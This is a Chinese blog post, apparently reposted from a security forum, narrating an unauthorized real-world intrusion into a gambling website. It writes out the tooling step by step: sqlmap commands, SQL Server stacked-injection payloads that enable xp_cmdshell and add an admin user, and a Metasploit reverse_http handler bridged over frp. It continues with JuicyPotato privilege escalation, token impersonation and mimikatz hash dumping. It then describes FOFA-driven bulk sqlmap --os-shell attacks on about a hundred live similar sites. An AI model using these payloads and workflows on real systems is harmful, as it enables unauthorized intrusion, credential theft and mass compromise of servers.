> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/8924)

前言
--

我们的小团队对偶然发现的 bc 站点进行的渗透, 从一开始只有 sqlmap 反弹的无回显 os-shell 到 CS 上线, 到配合 MSF 上传脏土豆提权, 到拿下 SYSTEM 权限的过程, 分享记录一下渗透过程

0x01: 登录框 sql 注入
----------------

看到登录框没什么好说的, 先试试 sqlmap 一把梭

[![](https://xz.aliyun.com/t/%E4%B8%AA%E4%BA%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95-%E5%AF%B9%E6%9F%90bc%E7%AB%99%E7%9A%84%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/image-20201227024738519.png)](https://xz.aliyun.com/t/%E4%B8%AA%E4%BA%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95-%E5%AF%B9%E6%9F%90bc%E7%AB%99%E7%9A%84%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/image-20201227024738519.png)

burp 抓包登录请求, 保存到文件直接跑一下试试

```
python3 sqlmap.py -r "2.txt"
```

有盲注和堆叠注入

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228165509-634b8b1e-48ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228165509-634b8b1e-48ea-1.png)  
burp 抓包登录请求, 保存到文件直接跑一下试试

```
python3 sqlmap.py -r "2.txt"
```

有盲注和堆叠注入

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228165530-705ae426-48ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228165530-705ae426-48ea-1.png)  
看看能不能直接用 sqlmap 拿 shell

```
python3 sqlmap.py -r "2.txt" --os-shell
```

目测不行

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228165545-79342f6c-48ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228165545-79342f6c-48ea-1.png)

提示的是`xp_cmdshell`未开启, 由于之前扫出来有堆叠注入, 尝试运用存储过程打开`xp_cmdshell`

Payload:

```
userName=admin';exec sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure'xp_cmdshell', 1;RECONFIGURE;WAITFOR DELAY '0:0:15' --&password=123
```

延时 15 秒, 执行成功 (如果没有堆叠注入就把每个语句拆开一句一句执行, 效果理论上应该是一样的)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170034-25070882-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170034-25070882-48eb-1.png)  
顺便试试看直接用`xp_cmdshell`来加用户提权, 构造 payload(注意密码别设太简单, windows 系统貌似对密码强度有要求, 设太简单可能会失败)

```
userName=admin';exec xp_cmdshell 'net user cmdshell Test ZjZ0ErUwPcxRsgG8E3hL /add';exec master..xp_cmdshell 'net localgroup administrators Test /add';WAITFOR DELAY '0:0:15' --&password=123
```

nmap 扫了一下, 目标的 3389 是开着的,`mstsc.exe`直接连

没连上

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170100-34e1c62a-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170100-34e1c62a-48eb-1.png)

再跑一下 os-shell, 发现能跑绝对路径了, 好兆头

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170116-3e7ca42a-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170116-3e7ca42a-48eb-1.png)

成功弹出 shell

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170158-5797405a-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170158-5797405a-48eb-1.png)  
然后 CS 里啪的一下就上线了, 很快啊. 赶紧喊几个不讲武德的年轻人上线打牌

0x02: 信息收集
----------

`tasklist`看一下进程, 有阿里云盾, 有点难搞

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170226-6851318a-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170226-6851318a-48eb-1.png)  
`systeminfo`看看有什么

阿里云的服务器, 版本`windows server 2008 R2`打了 75 个补丁

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170241-71437488-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170241-71437488-48eb-1.png)  
`whoami`一下, 目测数据库被做过降权,`nt service`权限, 非常低

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170255-792703ae-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170255-792703ae-48eb-1.png)  
尝试传个`ms-16-032`的 exp 上去, 直接上传失败

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170307-80c6d9c2-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170307-80c6d9c2-48eb-1.png)  
到这里, CS 的作用已经极其有限了. CS 也就图一乐, 真渗透还得靠 MSF

0x03: 利用 frp 到 CS 服务端联动 MSF 攻击
------------------------------

在 CS 上开一个监听器

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170337-921770ba-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170337-921770ba-48eb-1.png)  
修改一下 frp 的配置文件

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170409-a550c1c2-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170409-a550c1c2-48eb-1.png)  
保存配置文件后在 frp 文件夹下启动 frp

```
./frpc -c frpc.ini
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170446-bb5a6ae0-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170446-bb5a6ae0-48eb-1.png)  
打开 msf 开启监听

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http 
set LHOST 127.0.0.1
set LPORT 9996
run
```

这里可以看到 MSF 已经开启监听了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170519-cf242fe8-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170519-cf242fe8-48eb-1.png)

回到 CS, 右键选一个主机增加一个会话

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170550-e15ec51a-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170550-e15ec51a-48eb-1.png)

选择刚创建好的监听器, choose

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170614-f0205aaa-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170614-f0205aaa-48eb-1.png)

回到 msf,session 啪的一下就弹回来了, 很快啊

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170633-fb47fe42-48eb-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170633-fb47fe42-48eb-1.png)  
我们进 shell 看一下, 实际上就是接管了 CS 的 beacon, 依然是低权限

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170707-0f93df4c-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170707-0f93df4c-48ec-1.png)

0x04: 上传烂土豆 EXP 提权
------------------

在本地准备好一个烂土豆的 EXP(注意 windows 路径多加个斜杠, 虽然也可以不加, 但试了几台机子发现加了成功率高, 不知道什么原理)

```
upload /root/EXP/JuicyPotato/potato.exe C:\\Users\\Public
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170750-295a5334-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170750-295a5334-48ec-1.png)

CS 翻一下目标机器的文件, 发现成功上传

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170815-37ebfbaa-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170815-37ebfbaa-48ec-1.png)  
然后进目标机器的这个文件夹下开始准备提权

```
cd C:\\Users\\Public
use incognito
execute -cH -f ./potato.exe
list_tokens -u
复制administrator的令牌
impersonate_token "administrator的令牌"
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170834-4365955e-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170834-4365955e-48ec-1.png)  
最后检查一下是否提权成功

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170854-4f15e4d0-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170854-4f15e4d0-48ec-1.png)

0x05:mimikatz 抓取密码 hash
-----------------------

先提个权

```
getsystem
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170912-59f28e30-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170912-59f28e30-48ec-1.png)

试试能不能直接 dump 出来

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170921-5f750b4e-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170921-5f750b4e-48ec-1.png)  
不行, 只好用 mimikatz 了

```
load mimikatz
```

然后抓取密码哈希

```
mimikatz_command -f samdump::hashes
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228170937-693a5bc0-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228170937-693a5bc0-48ec-1.png)

也可以用 MSF 自带的模块 (这个比 mimikatz 慢一点)

```
run post/windows/gather/smart_hashdump
```

然后丢到 CMD5 解密, 如果是弱口令可以解出账户密码, 这次运气比较好, 是个弱口令, 直接解出了密码, 然后`mstsc.exe`直接连, 成功上桌面

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228171008-7b4a9c30-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228171008-7b4a9c30-48ec-1.png)

0x06: 信息收集扩大攻击范围
----------------

成功获取到目标最高权限之后, 尝试通过信息收集获取其他相类似的站点进行批量化攻击.

@crow 师傅提取了该网站的 CMS 特征写了一个 fofa 脚本批量扫描, 最终得到了 1900 + 个站点

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228171030-88c44992-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228171030-88c44992-48ec-1.png)  
但由于 bc 站往往打一枪换一个地方, 这些域名往往大部分是不可用的, 因此需要再确认域名的存活状态, 使用脚本最终得到了一百多个存活域名

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228171053-95fc12a2-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228171053-95fc12a2-48ec-1.png)  
在使用脚本批量访问带漏洞的 URL, 把生成的 request 利用多线程脚本批量发起请求去跑这个请求

```
python3 sqlmap.py -r "{0}" --dbms="Microsoft SQL Server" --batch --os-shell
```

最终得到可以弹出 os-shell 的主机, 再通过手工注入 shellcode, 最终得到大量的上线主机

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228171114-a2774ace-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228171114-a2774ace-48ec-1.png)

0x07: 进后台逛逛
-----------

用数据库里查出来的管理员账号密码登录网站后台看一看

20 个人充值了 80 多万

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228171130-ac4d9a58-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228171130-ac4d9a58-48ec-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228171137-b02b37c0-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228171137-b02b37c0-48ec-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228171145-b51d9318-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228171145-b51d9318-48ec-1.png)  
还有人的游戏账号叫 "锦绣前程", 殊不知网赌就是在葬送自己的前程!

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228171155-bb7cff5a-48ec-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228171155-bb7cff5a-48ec-1.png)  
劝所有人远离赌博, 也希望陷进去的赌徒回头是岸!